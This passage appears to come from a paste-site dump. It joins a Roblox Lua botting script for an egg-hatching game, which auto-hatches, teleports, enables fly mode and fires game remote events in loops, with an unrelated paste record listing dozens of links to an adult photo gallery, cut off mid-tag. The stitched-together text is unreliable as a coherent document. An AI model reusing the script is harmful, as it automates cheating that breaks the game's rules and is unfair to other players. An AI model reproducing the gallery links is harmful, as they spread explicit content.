    local rifts = workspace.Rendered:FindFirstChild(""Rifts"")
    if not rifts then return nil end
    
    -- Store all available eggs with their priority and luck multiplier
    local availableEggs = {}
    
    -- Check all eggs and get their priority and luck info
    for _, eggId in ipairs(eggPriority) do
        local egg = rifts:FindFirstChild(eggId)
        if egg then
            local display = egg:FindFirstChild(""Display"")
            if display then
                -- Find the luck text if it exists
                local luckMultiplier = 0
                for _, descendant in ipairs(egg:GetDescendants()) do
                    if descendant.Name == ""Luck"" and descendant:IsA(""TextLabel"") and descendant.Text then
                        luckMultiplier = getLuckMultiplier(descendant.Text)
                        break
                    end
                end
                
                -- Store egg with priority index and luck multiplier
                table.insert(availableEggs, {
                    eggId = eggId,
                    eggName = eggMapping[eggId],
                    display = display,
                    priority = table.find(eggPriority, eggId) or #eggPriority + 1,
                    luckMultiplier = luckMultiplier
                })
            end
        end
    end
    
    -- Sort eggs by x25 first, then by priority, then by luck multiplier
    table.sort(availableEggs, function(a, b)
        -- Always prioritize x25 eggs over anything else
        if a.luckMultiplier == 25 and b.luckMultiplier ~= 25 then
            return true
        elseif a.luckMultiplier ~= 25 and b.luckMultiplier == 25 then
            return false
        -- If both are x25 or neither is x25, fall back to normal priority
        elseif a.priority == b.priority then
            -- Higher luck multiplier comes first
            return a.luckMultiplier > b.luckMultiplier
        end
        -- Lower priority index comes first (higher priority)
        return a.priority < b.priority
    end)
    
    -- Get the best egg
    local bestEgg = #availableEggs > 0 and availableEggs[1] or nil
    
    -- Set the flag for x25 egg if found
    isHatchingX25Egg = bestEgg and bestEgg.luckMultiplier == 25 or false
    
    -- Return the best egg or nil if none found
    return bestEgg
end

-- Function to check if we're near the egg
local function isNearEgg(eggDisplay)
    if not eggDisplay then return false end
    
    local player = game:GetService(""Players"").LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local humanoidRootPart = character:FindFirstChild(""HumanoidRootPart"")
    if not humanoidRootPart then return false end
    
    -- Check if we're within 10 studs of the egg
    local distance = (humanoidRootPart.Position - eggDisplay.Position).Magnitude
    return distance < 15
end

local function toggleAutoHatch()
    -- Only allow toggling on if mastery requirements are met
    if not isAutoHatching and not (PetsMasteryCompleted and BuffsMasteryCompleted) then
        -- Skip activation if mastery is not completed yet
        return false
    end
    
    isAutoHatching = not isAutoHatching
    
    if isAutoHatching then
        -- If auto potions not active yet, start it
        if not isAutoUsingPotions then
            toggleAutoUsePotion()
        end
        
        -- Start a new thread for continuous hatching
        autoHatchingThread = spawn(function()
            while isAutoHatching do
                -- Use pcall for error handling
                pcall(function()
                    -- Check coin levels
                    local currentCoins = GetCurrentCoins()
                    
                    -- If coins are below the low threshold, switch to pickup collection
                    if currentCoins < Low_Coins then
                        -- Enable pickup collection if not already collecting
                        if not isAutoCollectingPickups then
                            toggleAutoCollectPickups()
                            pickupCollectionStartedByHatcher = true
                            tempDisableHatching = true
                        end
                        task.wait(3) -- Wait before checking again
                        return
                    else
                        -- Only disable collection and resume hatching if we've reached the target (60% of max)
                        if currentCoins >= Max_Coins * 0.6 then
                            -- Re-enable hatching
                            tempDisableHatching = false
                            
                            -- Disable pickup collection if it was enabled by us
                            if isAutoCollectingPickups and pickupCollectionStartedByHatcher then
                                toggleAutoCollectPickups()
                                pickupCollectionStartedByHatcher = false
                            end
                        else
                            -- We're between Low_Coins and 60% target, keep collecting if already started
                            if isAutoCollectingPickups and pickupCollectionStartedByHatcher then
                                -- Continue collecting
                                task.wait(3)
                                return
                            else
                                -- No collection active, but we're between thresholds
                                -- Clear temp disable so we can hatch until low again
                                tempDisableHatching = false
                            end
                        end
                    end
                    
                    -- Only proceed with hatching if not temporarily disabled
                    if not tempDisableHatching then
                        -- Check if we're near Max_Coins - prioritize hatching
                        local shouldPrioritizeHatching = currentCoins >= Max_Coins * 0.95
                        
                        -- Find the best egg to hatch
                        local bestEgg = findBestEgg()
                        
                        -- If no eggs found, use Default_Egg
                        if not bestEgg then
                            -- Check if we're already near Default_Egg position by Y coordinate
                            local player = game:GetService(""Players"").LocalPlayer
                            local character = player.Character
                            if character then
                                local humanoidRootPart = character:FindFirstChild(""HumanoidRootPart"")
                                if humanoidRootPart then
                                    local playerPos = humanoidRootPart.Position
                                    local defaultEggY = Default_Egg.Position.Y - 7  -- Account for the -7 offset
                                    
                                    -- Only tween if we're not already near Default_Egg
                                    if math.abs(playerPos.Y - defaultEggY) > 10 then
                                        -- Create adjusted CFrame below Default_Egg
                                        local adjustedCFrame = Default_Egg * CFrame.new(0, -7, 0)
                                        
                                        -- Use adjusted CFrame for tweening
                                        local horizTween, vertTween = TweenCharacterToTarget(adjustedCFrame)
                                        
                                        -- Wait for the tween to complete
                                        if horizTween and vertTween then
                                            horizTween.Completed:Wait()
                                            vertTween.Completed:Wait()
                                        else
                                            task.wait(0.5) -- Reduced wait time
                                        end
                                    end
                                end
                            end
                            
                            -- Try hatching at the default location
                            local hatchAmount = 8
                            CurrentlyHatchingEgg = ""100M Egg""
                            game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                ""HatchEgg"", 
                                ""100M Egg"", -- Assuming a default egg name, adjust as needed
                                hatchAmount
                            )
                            
                            -- Press R key to skip egg opening
                            task.wait(0.05) -- Reduced wait time
                            VIM:SendKeyEvent(true, Enum.KeyCode.R, false, game)
                            task.wait(0.05) -- Reduced wait time
                            VIM:SendKeyEvent(false, Enum.KeyCode.R, false, game)
                            
                            task.wait(0.5) -- Reduced wait time
                        elseif currentCoins >= Low_Coins then
                            -- Use our tween function to move to the egg
                            local horizTween, vertTween = TweenCharacterToTarget(bestEgg.display)
                            
                            -- Wait for the tween to complete
                            if horizTween and vertTween then
                                horizTween.Completed:Wait()
                                vertTween.Completed:Wait()
                            else
                                task.wait(0.5) -- Reduced wait time
                            end
                            
                            -- Start hatching eggs (8 at a time)
                            local hatchAmount = 8
                            
                            -- Only try to hatch if we're near the egg
                            while GetCurrentCoins() >= Low_Coins do
                                -- Recheck for the best egg every time
                                local newBestEgg = findBestEgg()
                                
                                -- If no eggs available anymore, break out completely
                                if not newBestEgg then
                                    -- No eggs available at all, break and wait for next cycle
                                    break
                                elseif newBestEgg.eggId ~= bestEgg.eggId then
                                    -- A different (possibly better) egg is available - update and move to it
                                    bestEgg = newBestEgg
                                    
                                    -- Move to the new best egg
                                    local newHorizTween, newVertTween = TweenCharacterToTarget(bestEgg.display)
                                    if newHorizTween and newVertTween then
                                        newHorizTween.Completed:Wait()
                                        newVertTween.Completed:Wait()
                                    else
                                        task.wait(0.5) -- Reduced wait time
                                    end
                                end
                                
                                -- Make sure we're near the egg before hatching
                                if isNearEgg(bestEgg.display) then
                                    -- Hatch the egg
                                    CurrentlyHatchingEgg = bestEgg.eggName
                                    game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                        ""HatchEgg"", 
                                        bestEgg.eggName, 
                                        hatchAmount
                                    )
                                    
                                    -- Press R key to skip egg opening
                                    task.wait(0.05) -- Reduced wait time
                                    VIM:SendKeyEvent(true, Enum.KeyCode.R, false, game)
                                    task.wait(0.05) -- Reduced wait time
                                    VIM:SendKeyEvent(false, Enum.KeyCode.R, false, game)
                                    
                                    -- Wait a bit between hatches
                                    task.wait(0.5) -- Reduced wait time
                                    
                                    -- If coins go too low, break early
                                    if GetCurrentCoins() < Low_Coins * 1.1 then
                                        break
                                    end
                                else
                                    -- We've lost proximity to the egg, need to recheck
                                    break
                                end
                            end
                        end
                    end
                end)
                
                -- Wait before checking again
                task.wait(0.5) -- Reduced wait time for responsiveness
            end
        end)
    else
        -- If we're turning off auto hatching, also turn off auto potions
        if isAutoUsingPotions then
            toggleAutoUsePotion()
        end
        
        -- If we're turning off auto hatching, also turn off pickup collection if we started it
        if isAutoCollectingPickups and pickupCollectionStartedByHatcher then
            toggleAutoCollectPickups()
            pickupCollectionStartedByHatcher = false
        end
    end
    
    return isAutoHatching
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Auto Bubble & Sell Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function Auto_Bubble_And_Sell()
    -- Only activate if we haven't met all the completion conditions
    if Auto_Bubble_And_Sell_Active or 
       (AllMasteryCompleted and max_Upgrades_Reached) or 
       isAutoHatching then
        -- If already running, everything complete, or hatching is active, turn off
        Auto_Bubble_And_Sell_Active = false
        return false
    end
    
    Auto_Bubble_And_Sell_Active = true
    
    -- Start a new thread for continuous bubble blowing and selling/collecting
    Auto_Bubble_And_Sell_Thread = spawn(function()
        while Auto_Bubble_And_Sell_Active do
            -- Always blow bubbles regardless of location
            game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""BlowBubble"")
            
            -- Stop if auto hatching started or all tasks completed
            if isAutoHatching or (AllMasteryCompleted and max_Upgrades_Reached) then
                Auto_Bubble_And_Sell_Active = false
                break
            end
            
            -- First, always check and use buffs regardless of location
            pcall(function()
                -- Get fresh data
                local freshData = LocalDataService:Get()
                
                -- Check if Coins potion is active
                local hasCoinsPotion = false
                if freshData.ActivePotions and type(freshData.ActivePotions) == ""table"" then
                    if freshData.ActivePotions[""Coins""] and freshData.ActivePotions[""Coins""].Active then
                        hasCoinsPotion = true
                    end
                end
                
                -- Check if GoldRush buff is active
                local hasGoldRush = false
                if freshData.ActiveBuffs and type(freshData.ActiveBuffs) == ""table"" then
                    for _, buff in ipairs(freshData.ActiveBuffs) do
                        if buff.Name == ""GoldRush"" then
                            hasGoldRush = true
                            break
                        end
                    end
                end
                
                -- Use Coins potion if not active and we have one
                if not hasCoinsPotion then
                    local coinsPotion = getHighestLevelPotion(""Coins"")
                    if coinsPotion then
                        usePotion(coinsPotion.Name, coinsPotion.Level)
                        task.wait(0.5)
                    end
                end
                
                -- Use Golden Orb if GoldRush not active and we have some
                if not hasGoldRush and freshData.Powerups and freshData.Powerups[""Golden Orb""] and freshData.Powerups[""Golden Orb""] > 0 then
                    game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""UseGoldenOrb"")
                    task.wait(0.5)
                end
            end)
            
            -- Decide mode: Zen pickup collection OR Twilight bubble selling
            if max_Flavor_Reached and 
               (not PetsMasteryCompleted or not BuffsMasteryCompleted or not ShopsMasteryCompleted) then
                -- PICKUP COLLECTION MODE: Switch to Zen pickup collection for gems
                if not isAutoCollectingPickups then
                    toggleAutoCollectPickups() -- This will handle teleporting to Zen
                    task.wait(3) -- Give time for teleport
                end
                
                -- Don't attempt to sell bubbles in this mode (we're in Zen)
            else
                -- BUBBLE SELLING MODE: Turn off pickup collection if active
                if isAutoCollectingPickups then
                    toggleAutoCollectPickups()
                    task.wait(1)
                end
                
                -- Only attempt selling bubbles when we're in selling mode
                pcall(function()
                    -- Get player and character
                    local player = game:GetService(""Players"").LocalPlayer
                    local character = player.Character
                    
                    if character then
                        local humanoidRootPart = character:FindFirstChild(""HumanoidRootPart"")
                        if humanoidRootPart then
                            local playerPos = humanoidRootPart.Position
                            
                            -- Check if player is NOT in Twilight area (Y position ~6862)
                            if math.abs(playerPos.Y - 6862) > 30 then
                                -- Player is not at the right location, teleport there
                                game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(
                                    ""Teleport"", 
                                    ""Workspace.Worlds.The Overworld.Islands.Twilight.Island.Portal.Spawn""
                                )
                                task.wait(2) -- Longer wait after teleport
                            else
                                -- Player is at the right Y level, tween to the sell area
                                local sellRoot = workspace.Worlds[""The Overworld""].Islands.Twilight.Island.Sell.Root
                                if sellRoot then
                                    -- Check if already near the sell root
                                    local distance = (humanoidRootPart.Position - sellRoot.Position).Magnitude
                                    if distance > 10 then
                                        -- Tween to the sell area
                                        local horizontalTween, verticalTween = TweenCharacterToTarget(sellRoot)
                                        
                                        -- Wait for tweens to complete
                                        if horizontalTween then
                                            horizontalTween.Completed:Wait()
                                        end
                                        
                                        if verticalTween then
                                            verticalTween.Completed:Wait()
                                        end
                                        
                                        task.wait(0.5) -- Wait after tweening
                                    end
                                    
                                    -- Check bubble count after reaching sell area
                                    local GuiGum = player.PlayerGui.ScreenGui.HUD.Left.Currency.Bubble.Frame.Label.Text
                                    local current, max = extractNumbers(GuiGum)
                                    
                                    -- Sell bubbles if we have any
                                    if current and current > 1 then
                                        game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.Event:FireServer(""SellBubble"")
                                        task.wait(0.5) -- Wait after selling
                                    end
                                end
                            end
                        end
                    end
                end)
            end
            
            -- Check if all tasks completed
            if (AllMasteryCompleted and max_Upgrades_Reached) or isAutoHatching then
                Auto_Bubble_And_Sell_Active = false
                
                -- Turn off pickup collection if it's on
                if isAutoCollectingPickups then
                    toggleAutoCollectPickups()
                end
                
                break
            end
            
            -- Wait a small amount between cycles
            task.wait(0.3)
        end
    end)
    
    return Auto_Bubble_And_Sell_Active
end


-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Initialize Data Function ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

local function InitializePlayerData()
    -- Get fresh player data
    local freshData = LocalDataService:Get()
    
    -- Initialize all status flags based on current data
    if freshData then
        -- 1. Check flavor and gum upgrade status
        if freshData.Flavors then
            -- Get the highest price flavor to check if we've reached max flavor
            local max_flavor_item = get_Highest_Priced_Item(flavorsConfig)
            if freshData.Flavors[max_flavor_item] then
                max_Flavor_Reached = true
            else
                max_Flavor_Reached = false
            end
        else
            max_Flavor_Reached = false
        end
        
        if freshData.Gum then
            -- Get the highest price gum to check if we've reached max gum
            local max_gum_item = get_Highest_Priced_Item(gumConfig)
            if freshData.Gum[max_gum_item] then
                max_Gum_Reached = true
            else
                max_Gum_Reached = false
            end
        else
            max_Gum_Reached = false
        end
        
        max_Upgrades_Reached = max_Flavor_Reached and max_Gum_Reached
        
        -- 2. Check mastery completion status
        -- Function to check if mastery is completed based on available targets
        local function checkMasteryCompleted(masteryTargets)
            if not masteryTargets or #masteryTargets == 0 then
                return true -- No targets means mastery is completed
            end
            return false
        end
        
        -- Use FindAvailableAndMastery to update mastery targets
        FindAvailableAndMastery()
        
        -- Set completion flags based on target counts
        PetsMasteryCompleted = checkMasteryCompleted(Mastery_Pets_Targets)
        BuffsMasteryCompleted = checkMasteryCompleted(Mastery_Buffs_Targets)
        ShopsMasteryCompleted = checkMasteryCompleted(Mastery_Shops_Targets)
        
        -- Update combined mastery flag
        AllMasteryCompleted = PetsMasteryCompleted and BuffsMasteryCompleted and ShopsMasteryCompleted
        
        return true
    end
    
    return false
end

-- üåÄ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ Main Loop ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüåÄ

while true do
    -- Use pcall for the entire loop body to prevent script crashes
    local success, errorMsg = pcall(function()

        -- Handle intro once at the beginning
        if not hasHandledIntro then
            hasHandledIntro = handleIntro()
            if hasHandledIntro then
                -- Wait longer after handling the intro to ensure everything loads properly
                task.wait(5)
                InitializePlayerData()
                task.wait(10)
            end
        end

        -- First unlock areas and enable fly mode (basic setup)
        if not AreaUnlock_Toggle and not areasUnlocked then
            areasUnlocked = UnlockAreas()
        end

        if not isFlyModeActive then
            toggleFlyMode()
        end

        -- Check and update mastery progress
        if not isAutoMastery then
            FindAvailableAndMastery()
        end

        -- Bubble and sell OR hatch eggs based on mastery progress
        if PetsMasteryCompleted and BuffsMasteryCompleted then
            -- Mastery complete - focus on hatching
            if not isAutoHatching then
                toggleAutoHatch()
            elseif isAutoHatching and not isAutoUsingPotions then
                -- Make sure potions are enabled when hatching is active
                toggleAutoUsePotion()
            end
        else
            -- Mastery not complete - focus on bubble selling
            if not Auto_Bubble_And_Sell_Active and not isAutoHatching then
                Auto_Bubble_And_Sell()
            end
        end

        -- Always handle pet deletion
        if not isAutoDeletingPets then
            toggleAutoPetDeletion()
        end

        -- Check for daily rewards
        if not CheckRewards_Toggle and not hasClaimedDailyReward then
            hasClaimedDailyReward = checkDailyRewards()
        end

        -- Claim playtime rewards
        if not AutoClaimPlaytime_Toggle and not PlaytimeRewardsClaimed then
            toggleAutoClaimPlaytime()
        end

        -- Apply optimal settings
        if not SetSettings_Toggle and not settingsApplied then
            SetOptimalSettings()
        end

        -- Claim prizes
        if not AutoClaimPrizes_Toggle then
            toggleAutoClaimPrizes()
        end
        
        -- Buy items if not already running and not completed
        if not AutoBuy_Toggle and not max_Upgrades_Reached then
            AutoBuy_Toggle, max_Flavor_Reached, max_Gum_Reached, max_Upgrades_Reached = AutoBuyItems()
        end
        
        -- Hide overlays
        if not AutoHideOverlay_Toggle then
            toggleAutoHideOverlay()
        end
        
        -- Use mystery boxes
        if not AutoMysteryBoxes_Toggle then
            toggleAutoMysteryBoxes()
        end

        -- Spin wheel
        if not AutoWheelSpin_Toggle then
            toggleAutoWheelSpin()
        end

        -- Craft potions
        if not isAutoCraftingPotions then
            toggleAutoCraftPotions()
        end

        -- Only run reroll enchants if mastery requirements are met
        if not RerollEnchants_Toggle and (PetsMasteryCompleted and BuffsMasteryCompleted) then
            RerollEnchants()
        end

        if not isPressingB then
            togglePeriodicB()
        end    

        if not isAutoBuyingShopItems then
            toggleAutoBuyShopItems()
        end

        if not SecretPetCheck_Toggle then
            checkForSecretPets()
        end

        if not isEggCounterEnabled then
            toggleEggCounter()
        end

        -- Wait a bit to prevent the game from lagging
        task.wait(0.2)
    end)
    
    -- Handle any errors that occurred during execution
    if not success then
        print(""ERROR IN MAIN LOOP: "" .. tostring(errorMsg))
        -- Wait a bit before continuing to prevent error spam
        task.wait(2)
    end
    
    -- Always have a small wait to prevent infinite loops if the task.wait inside pcall fails
    task.wait(0.1)
end"
QWVjA5v7,[Femjoy] Shania Vega - Seaside Story (x69) - Apr 28,MarcSpencer,HTML,Monday 28th of April 2025 11:14:29 PM CDT,"[Femjoy] Shania Vega - Seaside Story (x69) - Apr 28
<a href=""https://fappic.com/9z0qdoqptgj7/nw5lwo263mml.jpeg""><img src=""https://img103.fappic.com/i/03921/9z0qdoqptgj7_t.jpg""></a><a href=""https://fappic.com/bht83d6x16rk/5vb74a7zl7u4.jpg""><img src=""https://img103.fappic.com/i/03921/bht83d6x16rk_t.jpg""></a><a href=""https://fappic.com/i3tl736k9hd6/q6x4jvyqoms8.jpg""><img src=""https://img103.fappic.com/i/03921/i3tl736k9hd6_t.jpg""></a><a href=""https://fappic.com/fj6eq02qlgg4/23n7bowtz16p.jpg""><img src=""https://img103.fappic.com/i/03921/fj6eq02qlgg4_t.jpg""></a><a href=""https://fappic.com/g80u0tfc2qd1/6lyytu68qf80.jpg""><img src=""https://img103.fappic.com/i/03921/g80u0tfc2qd1_t.jpg""></a><a href=""https://fappic.com/6cwv4jv1n52s/whymyzf2n2od.jpg""><img src=""https://img103.fappic.com/i/03921/6cwv4jv1n52s_t.jpg""></a><a href=""https://fappic.com/cojnysp2wdbd/v5un69tlqush.jpg""><img src=""https://img103.fappic.com/i/03921/cojnysp2wdbd_t.jpg""></a><a href=""https://fappic.com/ldtrsw22m1dz/jlujek5e0n81.jpg""><img src=""https://img103.fappic.com/i/03921/ldtrsw22m1dz_t.jpg""></a><a href=""https://fappic.com/zzfbzncqd615/i9jdb9dqw6ky.jpg""><img src=""https://img103.fappic.com/i/03921/zzfbzncqd615_t.jpg""></a><a href=""https://fappic.com/s3ultyatv5y8/voz8bsmzbrav.jpg""><img src=""https://img103.fappic.com/i/03921/s3ultyatv5y8_t.jpg""></a><a href=""https://fappic.com/6o0rjnu8u5mh/8ihcsekt6iyv.jpg""><img src=""https://img103.fappic.com/i/03921/6o0rjnu8u5mh_t.jpg""></a><a href=""https://fappic.com/oo8mwspfq93e/lmn6136trryd.jpg""><img src=""https://img103.fappic.com/i/03921/oo8mwspfq93e_t.jpg""></a><a href=""https://fappic.com/7pllsg57h6np/iar5sg78ocnr.jpg""><img src=""https://img103.fappic.com/i/03921/7pllsg57h6np_t.jpg""></a><a href=""https://fappic.com/3gmqmq08x4nq/let8b9l9tyal.jpg""><img src=""https://img103.fappic.com/i/03921/3gmqmq08x4nq_t.jpg""></a><a href=""https://fappic.com/da3fpjmf4zmt/ow5pvgxmrj3k.jpg""><img src=""https://img103.fappic.com/i/03921/da3fpjmf4zmt_t.jpg""></a><a href=""https://fappic.com/np72w87htgl5/1n9ggw0qzkl1.jpg""><img src=""https://img103.fappic.com/i/03921/np72w87htgl5_t.jpg""></a><a href=""https://fappic.com/cib0x40mzhkl/cvfdxrne01gl.jpg""><img src=""https://img103.fappic.com/i/03921/cib0x40mzhkl_t.jpg""></a><a href=""https://fappic.com/hr946ivrbkml/2j2k9invqi39.jpg""><img src=""https://img103.fappic.com/i/03921/hr946ivrbkml_t.jpg""></a><a href=""https://fappic.com/degfax5kqfv0/4aizn4rnjsj3.jpg""><img src=""https://img103.fappic.com/i/03921/degfax5kqfv0_t.jpg""></a><a href=""https://fappic.com/5wmprd4dzmm9/qq4ldbg89wma.jpg""><img src=""https://img103.fappic.com/i/03921/5wmprd4dzmm9_t.jpg""></a><a href=""https://fappic.com/2wrbauq0teou/tv8u3skf4p8q.jpg""><img src=""https://img103.fappic.com/i/03921/2wrbauq0teou_t.jpg""></a><a href=""https://fappic.com/hclizyumdyjr/iz0jhaqueva2.jpg""><img src=""https://img103.fappic.com/i/03921/hclizyumdyjr_t.jpg""></a><a href=""https://fappic.com/xwmeiyt9qdz8/3vc42l3bh2q3.jpg""><img src=""https://img103.fappic.com/i/03921/xwmeiyt9qdz8_t.jpg""></a><a href=""https://fappic.com/68uu5b3lsc3t/x1lekd9xzana.jpg""><img src=""https://img103.fappic.com/i/03921/68uu5b3lsc3t_t.jpg""></a><a href=""https://fappic.com/aoefg4qxchsi/2uzn0smlxapm.jpg""><img src=""https://img103.fappic.com/i/03921/aoefg4qxchsi_t.jpg""></a><a href=""https://fappic.com/x71qi48lpded/hbvh1dtlq32o.jpg""><img src=""https://img103.fappic.com/i/03921/x71qi48lpded_t.jpg""></a><a href=""https://fappic.com/1ylel4hdhtxn/u2xpmh1h9bx3.jpg""><img src=""https://img103.fappic.com/i/03921/1ylel4hdhtxn_t.jpg""></a><a href=""https://fappic.com/7evmsfi9abaf/btczl0mpeztc.jpg""><img src=""https://img103.fappic.com/i/03921/7evmsfi9abaf_t.jpg""></a><a href=""https://fappic.com/1ch9flq1nikc/5nmjynx2d4y4.jpg""><img src=""https://img103.fappic.com/i/03921/1ch9flq1nikc_t.jpg""></a><a href=""https://fappic.com/3eg3ca633euw/0jkonze46pkc.jpg""><img src=""https://img103.fappic.com/i/03921/3eg3ca633euw_t.jpg""></a><a href=""https://fappic.com/gwkub1e9omtp/6kjl16ky5ffu.jpg""><img src=""https://img103.fappic.com/i/03921/gwkub1e9omtp_t.jpg""></a><a href=""https://fappic.com/aosxnnl6s1wa/46fwuvy3o78z.jpg""><img src=""https://img103.fappic.com/i/03921/aosxnnl6s1wa_t.jpg""></a><a href=""https://fappic.com/djypvadqp8xx/vhhvttjb5fla.jpg""><img src=""https://img103.fappic.com/i/03921/djypvadqp8xx_t.jpg""></a><a href=""https://fappic.com/i2uytqca5kqg/go43a5s3fuz8.jpg""><img src=""https://img103.fappic.com/i/03921/i2uytqca5kqg_t.jpg""></a><a href=""https://fappic.com/lwca1qgosi4q/4ml9h2vg46fp.jpg""><img src=""https://img103.fappic.com/i/03921/lwca1qgosi4q_t.jpg""></a><a href=""https://fappic.com/kch12foyn4sw/ff244uyj6fq3.jpg""><img src=""https://img103.fappic.com/i/03921/kch12foyn4sw_t.jpg""></a><a href=""https://fappic.com/0cokc9a8q86e/wipduazt5uua.jpg""><img src=""https://img103.fappic.com/i/03921/0cokc9a8q86e_t.jpg""></a><a href=""https://fappic.com/xr063ykzoy9j/yvdegytednm5.jpg""><img src=""https://img103.fappic.com/i/03921/xr063ykzoy9j_t.jpg""></a><a href=""https://fappic.com/457uw0qh5rqn/m4i0o2datw98.jpg""><img src=""https://img103.fappic.com/i/03921/457uw0qh5rqn_t.jpg""></a><a href=""https://fappic.com/47h60zhszp13/8wvv718whiv8.jpg""><img src=""https://img103.fappic.com/i/03921/47h60zhszp13_t.jpg""></a><a href=""https://fappic.com/ty02p3wi0gw1/ulaq925xifbk.jpg""><img src=""https://img103.fappic.com/i/03921/ty02p3wi0gw1_t.jpg""></a><a href=""https://fappic.com/res48iv1k8pa/0mrpis0la2bv.jpg""><img src=""https://img103.fappic.com/i/03921/res48iv1k8pa_t.jpg""></a><a href=""https://fappic.com/h5y2ldvflh11/820anlbhfdza.jpg""><img src=""https://img103.fappic.com/i/03921/h5y2ldvflh11_t.jpg""></a><a href=""https://fappic.com/96lc0ogwumlf/byk4nq343hy8.jpg""><img src=""https://img103.fappic.com/i/03921/96lc0ogwumlf_t.jpg""></a><a href=""https://fappic.com/dyyiqvxyx3cr/xfqvxc6k01pj.jpg""><img src=""https://img103.fappic.com/i/03921/dyyiqvxyx3cr_t.jpg""></a><a href=""https://fappic.com/hsrwg8ugv3a0/1nrhz8718ax2.jpg""><img src=""https://img103.fappic.com/i/03921/hsrwg8ugv3a0_t.jpg""></a><a href=""https://fappic.com/7xxytpuj0yo9/wx3tdrp4dasx.jpg""><img src=""https://img103.fappic.com/i/03921/7xxytpuj0yo9_t.jpg""></a><a href=""https://fappic.com/8tf1okzmu3ur/33hlj8pw2byx.jpg""><img src=""https://img103.fappic.com/i/03921/8tf1okzmu3ur_t.jpg""></a><a href=""https://fappic.com/qsiqiu5uiwva/u0o8jkj77xuq.jpg""><img src=""https://img103.fappic.com/i/03921/qsiqiu5uiwva_t.jpg""></a><a href=""https://fappic.com/pz1mxj3fa7pq/f5q4dw7jjf5e.jpg""><img src=""https://img103.fappic.com/i/03921/pz1mxj3fa7pq_t.jpg""></a><a href=""https://fappic.com/upxqefeee3th/hax08e4q290w.jpg""><img src=""https://img103.fappic.com/i/03921/upxqefeee3th_t.jpg""></a><a href=""https://fappic.com/yu79a22imcd6/xpipxus09kfo.jpg""><img src=""https://img103.fappic.com/i/03921/yu79a22imcd6_t.jpg""></a><a href=""https://fappic.com/dhb1gki82ndx/pkjz1m1zesp4.jpg""><img src=""https://img103.fappic.com/i/03921/dhb1gki82ndx_t.jpg""></a><a href=""https://fappic.com/94a78ks6e6lr/509h80w5t0ch.jpg""><img src=""https://img103.fappic.com/i/03921/94a78ks6e6lr_t.jpg""></a><a href=""https://fappic.com/e6of5s9x6wqk/tcysto38dbs3.jpg""><img src=""https://img103.fappic.com/i/03921/e6of5s9x6wqk_t.jpg""></a><a href=""https://fappic.com/1ja6tbyg1fj2/crv1fbull55g.jpg""><img src=""https://img103.fappic.com/i/03921/1ja6tbyg1fj2_t.jpg""></a><a href=""https://fappic.com/wu2xxxjjhezm/gm3tdsud2023.jpg""><img src=""https://img103.fappic.com/i/03921/wu2xxxjjhezm_t.jpg""></a><a href=""https://fappic.com/y4oe6y3l9tpl/vyateom8qj0a.jpg""><img src=""https://img103.fappic.com/i/03921/y4oe6y3l9tpl_t.jpg""></a><a href=""https://fappic.com/om83sydww81b/rih88f3wuv7e.jpg""><img src=""https://img103.fappic.com/i/03921/om83sydww81b_t.jpg""></a><a href=""https://fappic.com/vd79hf2f06lz/62nuqhsncs8c.jpg""><img src=""https://img103.fappic.com/i/03921/vd79hf2f06lz_t.jpg""></a><a href=""https://fappic.com/ys4r1q0x4d15/ainzlfveozdd.jpg""><img src=""https://img103.fappic.com/i/03921/ys4r1q0x4d15_t.jpg""></a><a href=""https://fappic.com/m65yxesabv8r/kvnt0j5dp8ti.jpg""><img src=""https://img103.fappic.com/i/03921/m65yxesabv8r_t.jpg""></a><a href=""https://fappic.com/pwpa3yz4st11/8ryzq6empfhv.jpg""><img src=""https://img103.fappic.com/i/03921/pwpa3yz4st11_t.jpg""></a><a 